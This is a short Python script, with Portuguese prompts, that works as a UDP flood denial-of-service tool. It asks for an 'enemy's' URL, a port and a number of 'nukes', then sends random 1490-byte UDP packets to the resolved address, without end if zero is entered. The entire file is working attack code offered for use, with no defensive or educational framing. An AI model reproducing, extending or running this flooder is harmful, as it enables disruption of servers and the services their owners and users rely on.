import requests
import os
import socket
import random
from urllib.parse import urlparse

print("""
*************************
*     :)                *
* criado por tylor swift*
*                       *
*************************
""")
print("escreva a URL do seu inimigo (with http:// or https://)")
url = input()
parsed_url = urlparse(url)
gonnacooked = parsed_url.hostname  
print("qual porta você quer atacar?(geralemete 80 ou 443)")
whichport = int(input())  
print("quantas vezes você quer atacar? (recomendado 1000 ou mais)")
print("se você colocar 0, ele vai atacar indefinidamente")
amountofnukes = int(input())  

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear" if os.name == "posix" else "cls")

nukes = 0
try:
    ip = socket.gethostbyname(gonnacooked)  
except socket.gaierror:
    print("invalid hostname. Could not resolve IP.")
    exit()

target = (ip, whichport)
print(f"starting attack on {target[0]}:{target[1]}")
if amountofnukes == 0:
    print("Atacando indefinidamente...")
    while True:
        sock.sendto(bytes, target)
        nukes += 1
        print(f"atacado esse servidor... Sent: {nukes} by tylor swift")
else:
    for _ in range(amountofnukes):
        sock.sendto(bytes, target)
        nukes += 1
        print(f"atacado esse servidor... Sent: {nukes} by tylor swift")
while nukes < amountofnukes:
    sock.sendto(bytes, target)
    nukes += 1
    print(f"atacado esse servidor... Sent: {nukes} by tylor swift")

print("feito")
print(f"total de ataques: {nukes}")
input("pressione enter para sair")

